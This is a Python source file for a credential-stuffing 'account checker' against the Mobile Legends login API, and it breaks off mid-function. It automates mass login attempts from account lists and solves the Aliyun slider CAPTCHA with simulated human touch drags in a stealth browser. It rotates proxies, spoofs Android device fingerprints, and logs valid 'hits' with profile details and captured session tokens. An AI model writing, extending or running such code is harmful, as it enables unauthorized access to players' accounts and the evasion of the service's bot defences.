# -*- coding: utf-8 -*-
# author: Tyraaah
"""
app.py — WAF Solver (browser-backed, warm-page pool) + Account Checker

Login response shapes supported (all classified as 'valid'):
  A) {code:0, guid:"...", session:"...", name:"...", left_num:N}  ← modern
  B) {code:0, u_atoken:"...", u_asig:"..."}                        ← legacy
  C) {code:0, data:{u_atoken:"...", u_asig:"..."}}                 ← legacy nested

WAF solving uses the nixv4.py pattern:
  One fetch, one loop. Poll the fetch promise AND the slider together.
  When the slider appears, solve it in place. The initial fetch resolves
  once the slider is solved — never re-fire.

pip install flask curl_cffi cloakbrowser requests
python app.py --check-accounts accounts.txt --workers 3 --retries 3 --headless
python app.py --launch --slots 4 --headless
"""
import hashlib, json, sys, time, random, string, threading, uuid, os, re
import queue, asyncio, math
from flask import Flask, Response, request, jsonify
from datetime import datetime

try:
    from curl_cffi.requests import Session
except ImportError:
    print("[!] pip install curl_cffi flask"); sys.exit(1)

try:
    from cloakbrowser import launch_async
    _HAS_BROWSER = True
except ImportError:
    _HAS_BROWSER = False
    print("[!] cloakbrowser not installed: pip install cloakbrowser")
    print("    (browser solver disabled — /api/solve will return 503)")

app = Flask(__name__)

import logging as _logging
class _QuietPollFilter(_logging.Filter):
    def filter(self, record):
        try:
            msg = record.getMessage()
        except Exception:
            return True
        for path in ('/api/tokens', '/api/status', '/api/solve', '/api/waf'):
            if path in msg:
                return False
        return True
_logging.getLogger('werkzeug').addFilter(_QuietPollFilter())

LOGIN_URL   = 'https://accountmtapi.mobilelegends.com'
API_URL     = 'https://accountmtapi.mobilelegends.com/'
LOGIN_PAGE  = 'https://mtacc.mobilelegends.com/v3.0/inapp/loginbyemail'
PROFILE_URL = 'https://api.mobilelegends.com/api/role/get_self_role'
MONITOR_KEY = 'ABCD1234'
HERE        = os.path.dirname(os.path.abspath(__file__))

SESSION_RESET_S   = int(os.environ.get('WAF_SESSION_MAX_AGE', '120'))
WARM_SIZE         = int(os.environ.get('WAF_WARM_PAGES', '6'))
WARM_REBUILD_USE  = int(os.environ.get('WAF_WARM_REBUILD', '20'))
POLL_INTERVAL     = float(os.environ.get('WAF_POLL_INTERVAL', '0.08'))
SOLVE_TIMEOUT_S   = int(os.environ.get('WAF_SOLVE_TIMEOUT', '45'))
MAX_DRAG_ATTEMPTS = 6
FETCH_TIMEOUT_MS  = int(os.environ.get('WAF_FETCH_TIMEOUT_MS', '30000'))

_DEBUG = os.environ.get('WAF_DEBUG', '1') != '0'

def dbg(msg):
    if _DEBUG:
        print(f"  DBG {msg}", flush=True)

TOKEN_FILE = os.path.join(HERE, 'tokens.txt')
_token_file_lock = threading.Lock()

FETCH_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "com.mobile.legends",
    "Referer": LOGIN_PAGE,
    "Origin": "https://mtacc.mobilelegends.com",
}

LOGIN_HOSTS = ("accountmtapi.mobilelegends.com",)

# ─────────────────────────────────────────────────────────────
#  PAYLOAD HELPERS
# ─────────────────────────────────────────────────────────────
def _md5(t): return hashlib.md5(t.encode()).hexdigest()

def _make_payload(email, password):
    h = _md5(password)
    p = {"account": email, "md5pwd": h, "country": ""}
    s = _md5("&".join(f"{k}={v}" for k, v in sorted(p.items())) + "&op=new_login_pwd")
    return json.dumps({"op": "new_login_pwd", "sign": s, "params": p, "lang": "en"})

def _dummy_payload():
    return _make_payload("waf_probe@example.com", "000000")

# ─────────────────────────────────────────────────────────────
#  ABORTABLE FETCH JS (nixv4.py pattern)
# ─────────────────────────────────────────────────────────────
def _abortable_fetch_js(body, var_name="__loginPromise",
                        abort_var="__loginAbort",
                        timeout_ms=None):
    if timeout_ms is None:
        timeout_ms = FETCH_TIMEOUT_MS
    return (
        f"(()=>{{"
        f"try{{if(window.{abort_var})window.{abort_var}.abort();}}catch(e){{}}"
        f"const ctl=new AbortController();"
        f"window.{abort_var}=ctl;"
        f"const tm=setTimeout(()=>{{try{{ctl.abort();}}catch(e){{}}}},{timeout_ms});"
        f"window.{var_name}=fetch('{API_URL}',{{method:'POST',credentials:'include',"
        f"headers:{json.dumps(FETCH_HEADERS)},body:{json.dumps(body)},signal:ctl.signal}})"
        f".then(r=>r.text())"
        f".catch(e=>'FETCH_ERR:'+((e&&e.name==='AbortError')?'timeout_abort':(e&&e.message||e)))"
        f".finally(()=>clearTimeout(tm));"
        f"}})();"
    )

def _abort_pending_js(abort_var="__loginAbort"):
    return f"()=>{{try{{if(window.{abort_var})window.{abort_var}.abort();}}catch(e){{}}}}"

# ─────────────────────────────────────────────────────────────
#  SESSION / TOKEN EXTRACTION (accepts BOTH shapes)
# ─────────────────────────────────────────────────────────────
_ASIG_KEYS   = ('u_asig', 'asig', 'u_sign', 'sign_token', 'u_token_sign')
_ATOKEN_KEYS = ('u_atoken', 'atoken', 'u_token', 'token')

def _extract_session(j):
    """
    Normalise a login response into:
      {guid, session, u_atoken, u_asig, name, left_num,
       ok: bool, kind: 'session' | 'token' | 'invalid' | 'retry' | 'error'}
    Accepts BOTH shapes (session-based and legacy token-based).
    """
    out = {'guid': '', 'session': '', 'u_atoken': '', 'u_asig': '',
           'name': '', 'left_num': None, 'ok': False, 'kind': 'retry'}

    if not isinstance(j, dict):
        return out

    code = j.get('code', -999)
    data = j.get('data') if isinstance(j.get('data'), dict) else {}

    # Terminal invalid codes
    if code in (1005, 3301, 3302, 1086, 1087):
        out['kind'] = 'invalid'
        return out

    # Terminal retry codes
    if code in (1013, -2):
        out['kind'] = 'retry'
        return out

    if code != 0:
        out['kind'] = 'error'
        return out

    # code==0 → success; pull whatever identifying fields exist
    def pick(*keys):
        for src in (j, data):
            if not isinstance(src, dict):
                continue
            for k in keys:
                v = src.get(k)
                if v not in (None, ''):
                    return v
        return ''

    out['guid']    = str(pick('guid', 'roleId', 'role_id') or '')
    out['session'] = str(pick('session', 'session_id', 'sessionKey') or '')
    out['name']    = str(pick('name', 'account', 'roleName') or '')
    ln = pick('left_num', 'leftNum')
    try:
        out['left_num'] = int(ln) if ln not in (None, '') else None
    except Exception:
        out['left_num'] = None

    # Legacy token fields (search both data and top level)
    for src in (data, j):
        if not isinstance(src, dict):
            continue
        for k in _ASIG_KEYS:
            v = src.get(k)
            if v:
                out['u_asig'] = v
                break
        if out['u_asig']:
            for k in _ATOKEN_KEYS:
                v = src.get(k)
                if v:
                    out['u_atoken'] = v
                    break
            break

    # Success = session OR token
    if out['guid'] and out['session']:
        out['ok'] = True
        out['kind'] = 'session'
    elif out['u_asig']:
        out['ok'] = True
        out['kind'] = 'token'

    return out


def _looks_terminal(j):
    """True if this JSON is the final authenticated (or invalid-code) response."""
    if not isinstance(j, dict):
        return False
    code = j.get('code', -999)
    if code in (1005, 3301, 3302, 1086, 1087):
        return True
    if code != 0:
        return False
    s = _extract_session(j)
    return s['ok']


def _classify_result(txt):
    """
    Returns (kind, payload).
    kind ∈ {valid, invalid, retry, error}.
    For 'valid', payload is a normalised dict with
      guid, session, u_atoken, u_asig, name, left_num, kind, raw
    """
    if not txt:
        return ('retry', {'message': 'empty'})
    if txt.startswith('FETCH_ERR'):
        return ('retry', {'message': txt[:80]})
    if not txt.strip().startswith('{'):
        if 'AliyunCaptcha' in txt or 'sceneId' in txt:
            return ('retry', {'message': 'slider_html'})
        return ('retry', {'message': f'html_{len(txt)}b'})
    try:
        d = json.loads(txt)
    except Exception:
        return ('retry', {'message': 'json_parse_fail'})

    code = d.get('code', -999)

    if code in (1013, -2):
        return ('retry', d)
    if code in (1005, 3301, 3302, 1086, 1087):
        return ('invalid', d)

    if code == 0:
        s = _extract_session(d)
        if s['ok']:
            payload = {
                'guid':     s['guid'],
                'session':  s['session'],
                'u_atoken': s['u_atoken'],
                'u_asig':   s['u_asig'],
                'name':     s['name'],
                'left_num': s['left_num'],
                'kind':     s['kind'],
                'raw':      d.get('data') or {},
            }
            return ('valid', payload)
        keys = sorted(d.keys())[:12]
        return ('retry', {'message': 'code0_no_session', 'keys': keys})

    return ('error', d)

# ─────────────────────────────────────────────────────────────
#  TOKEN SAVE (only when u_asig exists)
# ─────────────────────────────────────────────────────────────
def _save_token_url(token_data):
    try:
        atoken = token_data.get('u_atoken', '')
        asig = token_data.get('u_asig', '')
        if not asig:
            return
        url = f"{LOGIN_URL}/?u_atoken={atoken}&u_asig={asig}"
        with _token_file_lock:
            with open(TOKEN_FILE, 'a', encoding='utf-8') as f:
                f.write(url + '\n')
        _register_token_url(asig, url)
    except Exception as e:
        print(f"  \033[91m⚠ Token save failed: {e}\033[0m", flush=True)

# ─────────────────────────────────────────────────────────────
#  PROXY POOL
# ─────────────────────────────────────────────────────────────
PROXIES = []

def _load_proxies(path):
    global PROXIES
    try:
        with open(path, 'r') as f:
            raw = [line.strip() for line in f if line.strip()]
        seen = set()
        for p in raw:
            if p in seen: continue
            seen.add(p)
            if '://' in p:
                PROXIES.append(p)
            elif '@' in p:
                PROXIES.append(f"http://{p}")
            else:
                parts = p.split(':')
                if len(parts) == 4:
                    PROXIES.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
                elif len(parts) == 2:
                    PROXIES.append(f"http://{p}")
                else:
                    PROXIES.append(f"http://{p}")
        print(f"  \033[93m⚡ Loaded {len(PROXIES)} unique proxies from {path}\033[0m", flush=True)
    except FileNotFoundError:
        print(f"  \033[91m✗ Proxy file not found: {path}\033[0m", flush=True)

def _get_proxy():
    if not PROXIES:
        return None
    p = random.choice(PROXIES)
    return {'http': p, 'https': p}

DEVICES = [
    {'model':'SM-A055F','build':'AP3A.240905.015.A2','ver':'15','imp':'chrome','cv':'131.0.6778.200','brand':'"Chromium";v="131","Not_A Brand";v="24"'},
    {'model':'SM-A155F','build':'UP1A.231005.007',   'ver':'14','imp':'chrome','cv':'128.0.6613.146','brand':'"Chromium";v="128","Not;A=Brand";v="24"'},
    {'model':'SM-G990B','build':'UP1A.231005.007',   'ver':'14','imp':'chrome','cv':'126.0.6478.188','brand':'"Chromium";v="126","Not/A)Brand";v="8"'},
    {'model':'Pixel 7', 'build':'AP2A.240905.003',   'ver':'14','imp':'chrome','cv':'130.0.6723.116','brand':'"Chromium";v="130","Not?A_Brand";v="99"'},
    {'model':'Pixel 8', 'build':'AP3A.241005.015',   'ver':'15','imp':'chrome','cv':'131.0.6778.135','brand':'"Chromium";v="131","Not_A Brand";v="24"'},
    {'model':'Redmi Note 12','build':'TP1A.220624.014','ver':'13','imp':'chrome','cv':'124.0.6367.179','brand':'"Chromium";v="124","Not-A.Brand";v="99"'},
    {'model':'Redmi Note 13','build':'UKQ1.231108.001','ver':'14','imp':'chrome','cv':'129.0.6668.100','brand':'"Chromium";v="129","Not=A?Brand";v="8"'},
    {'model':'POCO X5',  'build':'UKQ1.230917.001',  'ver':'14','imp':'chrome','cv':'127.0.6533.103','brand':'"Chromium";v="127","Not)A;Brand";v="99"'},
    {'model':'POCO F5',  'build':'UKQ1.230917.001',  'ver':'14','imp':'chrome','cv':'125.0.6422.165','brand':'"Chromium";v="125","Not.A/Brand";v="24"'},
    {'model':'vivo Y36', 'build':'TP1A.220624.014',  'ver':'13','imp':'chrome','cv':'123.0.6312.118','brand':'"Chromium";v="123","Not:A-Brand";v="8"'},
    {'model':'vivo V29', 'build':'UP1A.231005.007',  'ver':'14','imp':'chrome','cv':'130.0.6723.86', 'brand':'"Chromium";v="130","Not?A_Brand";v="99"'},
    {'model':'OPPO A78', 'build':'TP1A.220624.014',  'ver':'13','imp':'chrome','cv':'126.0.6478.122','brand':'"Chromium";v="126","Not/A)Brand";v="8"'},
    {'model':'realme 11','build':'UKQ1.231108.001',  'ver':'14','imp':'chrome','cv':'128.0.6613.88', 'brand':'"Chromium";v="128","Not;A=Brand";v="24"'},
    {'model':'Samsung Galaxy A54','build':'UP1A.231005.007','ver':'14','imp':'chrome','cv':'129.0.6668.70','brand':'"Chromium";v="129","Not=A?Brand";v="8"'},
    {'model':'Infinix Note 30','build':'TP1A.220624.014','ver':'13','imp':'chrome','cv':'124.0.6367.113','brand':'"Chromium";v="124","Not-A.Brand";v="99"'},
    {'model':'Tecno Spark 10','build':'TP1A.220624.014','ver':'12','imp':'chrome','cv':'122.0.6261.119','brand':'"Chromium";v="122","Not(A:Brand";v="24"'},
]

def _make_ua(dev):
    return (f"Mozilla/5.0 (Linux; Android {dev['ver']}; {dev['model']} "
            f"Build/{dev['build']}; wv) AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Version/4.0 Chrome/{dev['cv']} Mobile Safari/537.36;UniWebView;mtakit")

def _make_sec_headers(dev):
    return {
        'Sec-Ch-Ua':          f'{dev["brand"]}',
        'Sec-Ch-Ua-Mobile':   '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Ch-Ua-Full-Version': dev['cv'],
        'Sec-Ch-Ua-Model':    f'"{dev["model"]}"',
        'Sec-Ch-Ua-Platform-Version': f'"{dev["ver"]}.0.0"',
    }

# ─────────────────────────────────────────────────────────────
#  SESSION STORE
# ─────────────────────────────────────────────────────────────
waf_sessions = {}
waf_sessions_lock = threading.Lock()

def _store_session(sid, dev, proxy, ua, sess):
    with waf_sessions_lock:
        waf_sessions[sid] = {'dev': dev, 'proxy': proxy, 'ua': ua, 'sess': sess, 'ts': time.time()}
        now = time.time()
        expired = [k for k, v in waf_sessions.items() if now - v['ts'] > 300]
        for k in expired:
            del waf_sessions[k]

# ─────────────────────────────────────────────────────────────
#  STATE
# ─────────────────────────────────────────────────────────────
TOKEN_EXPIRY = 240
lock         = threading.Lock()
token_pool   = []
used_sigs    = set()
known_sigs   = set()
sig_to_sid   = {}
sig_to_sid_lock = threading.Lock()
total_ok     = 0
total_fail   = 0
t_start      = time.time()
logs         = []

consumer_stats = {}
consumer_lock  = threading.Lock()

def _track_consumer(ip):
    with consumer_lock:
        if ip not in consumer_stats:
            consumer_stats[ip] = {'count': 0, 'first': time.time(), 'last': 0}
        consumer_stats[ip]['count'] += 1
        consumer_stats[ip]['last'] = time.time()

_token_url_map = {}
_token_url_map_lock = threading.Lock()

def _register_token_url(asig, url_line):
    with _token_url_map_lock:
        _token_url_map[asig] = url_line

def _cleanup_expired_tokens():
    while True:
        try:
            time.sleep(10)
            now = time.time()
            expired_sigs = set()
            with lock:
                active_sigs = {t.get('u_asig', '') for t in token_pool}
            with _token_url_map_lock:
                sigs_to_check = list(_token_url_map.keys())
            with lock:
                for sig in sigs_to_check:
                    if sig in used_sigs or sig not in active_sigs:
                        expired_sigs.add(sig)
            if not expired_sigs:
                continue
            with _token_file_lock:
                if not os.path.exists(TOKEN_FILE):
                    continue
                with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                new_lines = []
                removed = 0
                for line in lines:
                    line_stripped = line.strip()
                    if not line_stripped:
                        continue
                    m = re.search(r'u_asig=([^&\s]+)', line_stripped)
                    if m and m.group(1) in expired_sigs:
                        removed += 1
                        continue
                    new_lines.append(line)
                if removed > 0:
                    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
                        f.writelines(new_lines)
                    _log(f"🗑 Cleaned {removed} expired tokens from file", True)
            with _token_url_map_lock:
                for sig in expired_sigs:
                    _token_url_map.pop(sig, None)
        except Exception as e:
            print(f"  \033[91m⚠ Token cleanup error: {e}\033[0m", flush=True)

threading.Thread(target=_cleanup_expired_tokens, daemon=True).start()

def _log(msg, ok=True):
    global logs
    logs.append({'ts': datetime.now().strftime('%H:%M:%S'), 'msg': msg, 'ok': ok})
    if len(logs) > 200:
        logs = logs[-200:]

# ─────────────────────────────────────────────────────────────
#  POOL REGISTRATION
# ─────────────────────────────────────────────────────────────
def _register_pool_entry(atoken, asig, cookies, dev=None, sid=None,
                         synthetic=False):
    global total_ok
    if not asig:
        return False
    with lock:
        if asig in known_sigs:
            return False
        known_sigs.add(asig)
        entry = {
            'u_atoken':    atoken or '',
            'u_asig':      asig,
            'cookies':     cookies or {},
            'ts':          time.time(),
            '_added':      time.time(),
            'device':      (dev or {}).get('model', ''),
            'impersonate': (dev or {}).get('imp', 'chrome'),
            'cv':          (dev or {}).get('cv', ''),
            'brand':       (dev or {}).get('brand', ''),
            'ver':         (dev or {}).get('ver', ''),
            'synthetic':   bool(synthetic),
            'sid':         sid or None,
        }
        token_pool.append(entry)
        total_ok += 1
    if sid:
        with sig_to_sid_lock:
            sig_to_sid[asig] = sid
    _save_token_url(entry)
    _log(f"✓ #{total_ok} asig={asig[:24]}...")
    print(f"  \033[92m✓ Token #{total_ok}\033[0m — {asig[:30]}...", flush=True)
    return True

# ─────────────────────────────────────────────────────────────
#  BROWSER + WARM-PAGE POOL
# ─────────────────────────────────────────────────────────────
_waf_browser      = None
_waf_browser_lock = threading.Lock()
_waf_loop         = None
_waf_loop_ready   = threading.Event()

_warm_queue   = None
_warm_init    = None
_warm_browser = None

def _ensure_waf_loop():
    global _waf_loop
    with _waf_browser_lock:
        if _waf_loop is not None:
            return _waf_loop
        _waf_loop = asyncio.new_event_loop()
        def _run():
            asyncio.set_event_loop(_waf_loop)
            _waf_loop_ready.set()
            _waf_loop.run_forever()
        t = threading.Thread(target=_run, daemon=True, name="waf-loop")
        t.start()
        _waf_loop_ready.wait(timeout=5)
        return _waf_loop

async def _get_waf_browser():
    global _waf_browser
    if _waf_browser is None:
        _waf_browser = await launch_async(headless=True, humanize=True)
    return _waf_browser

async def _make_warm_page(browser, wid=0):
    ctx = await browser.new_context(has_touch=True)
    page = await ctx.new_page()
    page.set_default_timeout(25000)
    try:
        await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=30000)
    except Exception as e:
        dbg(f"w{wid} goto failed: {str(e)[:120]}")
    try:
        await page.wait_for_selector("#aliyunCaptcha-sliding-slider", timeout=4000)
        dbg(f"w{wid} WAF slider appeared")
    except Exception:
        pass
    dbg(f"w{wid} page ready (WAF will be solved inline during login)")
    return (ctx, page, wid, 0)

async def _init_warm_pool():
    global _warm_queue, _warm_browser, _warm_init
    if _warm_queue is not None:
        return
    _warm_browser = await _get_waf_browser()
    _warm_queue = asyncio.Queue()
    _warm_init = asyncio.Event()
    async def _prime():
        for wid in range(WARM_SIZE):
            try:
                dbg(f"w{wid} navigating...")
                item = await _make_warm_page(_warm_browser, wid)
                _warm_queue.put_nowait(item)
            except Exception as e:
                print(f"  \033[91m⚠ warm prime err w{wid}: {e}\033[0m", flush=True)
        _warm_init.set()
        print(f"  \033[92m✓ Warm pool ready ({WARM_SIZE} pages)\033[0m", flush=True)
    asyncio.ensure_future(_prime())

async def _acquire_warm():
    if _warm_queue is None:
        await _init_warm_pool()
    try:
        await asyncio.wait_for(_warm_init.wait(), timeout=30)
    except asyncio.TimeoutError:
        pass
    try:
        return await asyncio.wait_for(_warm_queue.get(), timeout=30)
    except asyncio.TimeoutError:
        browser = _warm_browser or await _get_waf_browser()
        return await _make_warm_page(browser, 0)

async def _rearm(ctx, page, wid, uses):
    try:
        if uses + 1 >= WARM_REBUILD_USE:
            try: await ctx.close()
            except Exception: pass
            browser = _warm_browser or await _get_waf_browser()
            item = await _make_warm_page(browser, wid)
            _warm_queue.put_nowait(item)
            return
        await page.goto("about:blank", wait_until="commit", timeout=8000)
        await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=20000)
        _warm_queue.put_nowait((ctx, page, wid, uses + 1))
    except Exception:
        try: await ctx.close()
        except Exception: pass
        try:
            browser = _warm_browser or await _get_waf_browser()
            item = await _make_warm_page(browser, wid)
            _warm_queue.put_nowait(item)
        except Exception:
            pass

def _spawn_rearm(ctx, page, wid, uses):
    asyncio.ensure_future(_rearm(ctx, page, wid, uses))

# ─────────────────────────────────────────────────────────────
#  TOUCH + DRAG (nixv4.py-style)
# ─────────────────────────────────────────────────────────────
async def _dispatch(cdp, etype, x, y, keep=False):
    pts = [] if keep else [{"x": float(x), "y": float(y),
                            "radiusX": 6, "radiusY": 6, "force": 1, "id": 1}]
    try:
        await cdp.send("Input.dispatchTouchEvent",
                       {"type": etype, "touchPoints": pts})
    except Exception:
        pass

async def _human_drag(ctx, page, sx, sy, dist):
    try:
        cdp = await ctx.new_cdp_session(page)
        R = lambda a, b: a + random.random() * (b - a)

        pts = []
        x = 0.0
        acc_end = dist * R(0.28, 0.40)
        for i in range(2 + int(random.random() * 2)):
            x += R(3, 7) * (1 + i * 0.6)
            if x > acc_end:
                x = acc_end
                break
            pts.append({"x": x, "d": R(6, 12)})
        nf = 4 + int(random.random() * 3)
        rem = dist - x
        for i in range(nf):
            step = rem / (nf - i) * R(0.8, 1.2)
            if step < 4 or x + step >= dist - 1:
                break
            x += step
            pts.append({"x": x, "d": R(2, 5)})
        pts.append({"x": dist + R(1.5, 3), "d": R(6, 11)})
        pts.append({"x": dist + R(-1, 1),   "d": R(5, 9)})
        pts.append({"x": dist,              "d": R(3, 6)})

        await _dispatch(cdp, "touchStart", sx, sy)
        await asyncio.sleep(R(8, 15) / 1000)
        for p in pts:
            prog = min(p["x"] / dist, 1.0) if dist > 0 else 0
            wb = 2.6 * math.sin(math.pi * prog)
            dy = wb * 0.3 if p["x"] >= dist else wb * R(0.55, 1.0)
            await _dispatch(cdp, "touchMove", sx + p["x"],
                            sy + dy + R(-0.4, 0.4))
            await asyncio.sleep(p["d"] / 1000)
        await _dispatch(cdp, "touchEnd", sx + dist, sy, keep=True)
        return True
    except Exception as e:
        print(f"  \033[91mdrag err: {e}\033[0m", flush=True)
        return False

# ─────────────────────────────────────────────────────────────
#  SLIDER SOLVE (nixv4.py geometry)
# ─────────────────────────────────────────────────────────────
async def _solve_waf_in_page(page, ctx, wid=0):
    try:
        present = await page.evaluate(
            "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
    except Exception:
        present = False
    if not present:
        return True, "no_slider"

    try:
        await page.wait_for_function(
            "()=>{const s=document.getElementById('aliyunCaptcha-sliding-slider');"
            "if(!s) return false;"
            "const r=s.getBoundingClientRect();"
            "return r.width>10 && r.height>10;}",
            timeout=5000)
    except Exception:
        return False, "slider_not_ready"

    box = await page.evaluate(r"""()=>{
        const s=document.getElementById('aliyunCaptcha-sliding-slider');
        if(!s) return null;
        const r=s.getBoundingClientRect();
        const w=s.closest('#aliyunCaptcha-sliding-wrapper')||s.parentElement;
        const pr=w?w.getBoundingClientRect():r;
        return {x:r.x,y:r.y,w:r.width,h:r.height,mt:pr.width-r.width};
    }""")
    if not box:
        return False, "no_box"

    try:
        pre_cookies = {c["name"] for c in await ctx.cookies()}
    except Exception:
        pre_cookies = set()
    pre_acw = {n for n in pre_cookies if n.startswith("acw")}

    dist = max(40.0, box.get("mt", 280.0))

    verify_ok = {"value": False}
    async def on_response(response):
        url = response.url or ""
        if not any(k in url for k in
                   ("verify", "slideVerify", "captcha", "_____tmd_____")):
            return
        try:
            text = await response.text()
            dbg(f"verify response: {response.status} {url[-70:]} body={text[:100]}")
            if ('"VerifyResult":true' in text
                or '"success":true' in text
                or '"Success":true' in text):
                verify_ok["value"] = True
        except Exception:
            pass
    page.on("response", on_response)

    sx = box["x"] + box["w"] / 2
    sy = box["y"] + box["h"] / 2
    dbg(f"sliding {int(dist)}px")
    dragged = await _human_drag(ctx, page, sx, sy, dist)

    solved = False
    reason = "drag_failed" if not dragged else "slider_still_visible"

    if dragged:
        for _ in range(60):
            if verify_ok["value"]:
                solved, reason = True, "verify_confirmed"
                break
            try:
                names = {c["name"] for c in await ctx.cookies()}
            except Exception:
                names = set()
            new_acw = {n for n in names if n.startswith("acw")} - pre_acw
            if new_acw:
                solved, reason = True, "acw_cookie"
                break
            try:
                still = await page.evaluate(
                    "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
            except Exception:
                still = True
            if not still:
                await asyncio.sleep(0.25)
                if verify_ok["value"]:
                    solved, reason = True, "hidden_and_cleared"
                else:
                    try:
                        names = {c["name"] for c in await ctx.cookies()}
                        new_acw = {n for n in names if n.startswith("acw")} - pre_acw
                        if new_acw:
                            solved, reason = True, "acw_cookie_after_hide"
                        else:
                            reason = "hidden_no_cookie"
                    except Exception:
                        reason = "hidden_no_cookie"
                break
            await asyncio.sleep(0.08)

    try:
        page.remove_listener("response", on_response)
    except Exception:
        pass
    return solved, reason

# ─────────────────────────────────────────────────────────────
#  COOKIE / SESSION HELPERS
# ─────────────────────────────────────────────────────────────
async def _collect_cookies(ctx):
    cookies = {}
    try:
        for ck in await ctx.cookies():
            cookies[ck['name']] = ck['value']
    except Exception:
        pass
    return cookies

def _make_cffi_session(dev, cookies):
    proxy = _get_proxy()
    try:
        sess = Session(impersonate=dev['imp'], verify=False, proxies=proxy)
    except Exception:
        sess = Session(impersonate='chrome', verify=False, proxies=proxy)
    for k, v in (cookies or {}).items():
        try: sess.cookies.set(k, v)
        except Exception: pass
    return sess, proxy

def _cookie_header(cookies):
    if not cookies:
        return ''
    return '; '.join(f"{k}={v}" for k, v in cookies.items() if v is not None)

# ─────────────────────────────────────────────────────────────
#  PROFILE LOOKUP (only works when a token session exists)
# ─────────────────────────────────────────────────────────────
async def _fetch_profile(sess, ua, dev, cookies):
    if not sess:
        return {}
    headers = {
        "User-Agent": ua,
        "Accept": "application/json",
        "X-Requested-With": "com.mobile.legends",
        "Referer": LOGIN_PAGE,
        "Origin": "https://mtacc.mobilelegends.com",
    }
    headers.update(_make_sec_headers(dev))
    try:
        r = sess.post(PROFILE_URL, headers=headers, timeout=12)
        if r.status_code == 200 and r.text.strip().startswith("{"):
            return r.json()
    except Exception:
        pass
    return {}

def _format_hit(nick, profile, payload=None):
    """
    Render a [ HIT ] line. Uses profile if we got one; otherwise falls back
    to the session payload (name + guid + session).
    """
    data = (profile or {}).get("data") or profile or {}
    p = payload or {}
    ign  = data.get("roleName") or data.get("nickname") or p.get('name') or nick
    lvl  = data.get("roleLevel") or data.get("level") or "?"
    rank = data.get("gradeName") or data.get("rank") or "?"
    skin = data.get("skinCount") or data.get("skins") or "?"
    tier = data.get("tier") or "No Tier"
    guid = p.get('guid') or data.get('guid') or '-'
    sess = p.get('session') or '-'
    return (
        f" [  HIT  ] {nick}:{nick}  ◆ {tier}\n"
        f"          └─ {ign} Lv{lvl} Skins:{skin} {rank}\n"
        f"          └─ GUID:{str(guid)[:14]}… Session:{str(sess)[:10]}…"
    )

# ─────────────────────────────────────────────────────────────
#  CORE: inline slider solve + login on one page (nixv4.py pattern)
# ─────────────────────────────────────────────────────────────
async def _solve_and_login(email, password, label=None, wid=0):
    if not _HAS_BROWSER:
        return None, {}, "browser_not_available", None

    lbl = label or email
    sid = uuid.uuid4().hex[:16]
    dev = random.choice(DEVICES)

    try:
        await _get_waf_browser()
        await _init_warm_pool()
        ctx, page, w_id, uses = await _acquire_warm()
    except Exception as e:
        return None, {}, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", sid

    wid = w_id
    fetch_js = _abortable_fetch_js(_make_payload(email, password))

    try:
        try:
            await page.evaluate(fetch_js)
        except Exception as e:
            dbg(f"w{wid} initial fetch eval error: {str(e)[:80]}")

        txt = ""
        drag_attempt = 0
        max_polls = int(SOLVE_TIMEOUT_S / 0.08) + 20

        for _poll in range(max_polls):
            try:
                combined = await page.evaluate("""async()=>{
                    const slider = !!document.getElementById('aliyunCaptcha-sliding-slider');
                    if (slider) return {slider:true, res:'__PENDING__'};
                    if (!window.__loginPromise) return {slider:false, res:'__PENDING__'};
                    const t = new Promise(r=>setTimeout(()=>r('__PENDING__'), 50));
                    const res = await Promise.race([window.__loginPromise, t]);
                    return {slider:false, res};
                }""")
            except Exception:
                combined = {"slider": False, "res": "__PENDING__"}

            if combined.get("res") and combined["res"] != "__PENDING__":
                txt = combined["res"]
                break

            if combined.get("slider"):
                drag_attempt += 1
                if drag_attempt > MAX_DRAG_ATTEMPTS:
                    dbg(f"w{wid} slider retry cap reached ({drag_attempt})")
                    break
                dbg(f"w{wid} slider during login, solving (attempt {drag_attempt})...")
                solved, _reason = await _solve_waf_in_page(page, ctx, wid)
                if solved:
                    dbg(f"w{wid} verify confirmed ✓")
                await asyncio.sleep(0.25)
                continue

            await asyncio.sleep(0.08)

        if not txt:
            try:
                txt = await page.evaluate("""async()=>{
                    if (!window.__loginPromise) return '';
                    const t = new Promise(r=>setTimeout(()=>r(''), 2000));
                    return await Promise.race([window.__loginPromise, t]);
                }""")
            except Exception:
                txt = ""

        try:
            await page.evaluate(
                "()=>{try{if(window.__loginAbort)window.__loginAbort.abort()}catch(e){};"
                "delete window.__loginPromise; delete window.__loginAbort;}")
        except Exception:
            pass

        cookies = await _collect_cookies(ctx)
        names = list(cookies.keys())
        acw = [n for n in names if n.startswith("acw")]
        dbg(f"w{wid} cookies after solve: {acw[:3]} (total {len(names)})")

        try:
            sess, proxy = _make_cffi_session(dev, cookies)
            _store_session(sid, dev, proxy, _make_ua(dev), sess)
        except Exception:
            pass

        _spawn_rearm(ctx, page, wid, uses)

        if not txt:
            return None, cookies, "timeout_poll", sid
        if txt.startswith("FETCH_ERR"):
            return None, cookies, txt[:80], sid
        return txt, cookies, None, sid

    except Exception as e:
        try:
            _spawn_rearm(ctx, page, wid, uses)
        except Exception:
            pass
        return None, {}, f"browser_error:{type(e).__name__}:{str(e)[:120]}", sid

# ─────────────────────────────────────────────────────────────
#  FAST PROBE
# ─────────────────────────────────────────────────────────────
async def _waf_probe_only():
    if not _HAS_BROWSER:
        return None, "browser_not_available", None, {}

    sid = uuid.uuid4().hex[:16]
    dev = random.choice(DEVICES)

    try:
        await _get_waf_browser()
        await _init_warm_pool()
        ctx, page, wid, uses = await _acquire_warm()
    except Exception as e:
        return None, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", None, {}

    try:
        slider_appeared = False
        ok = False
        reason = "no_slider"

        for attempt in range(3):
            try:
                await page.evaluate(_abortable_fetch_js(
                    _dummy_payload(), var_name="__wafProbe",
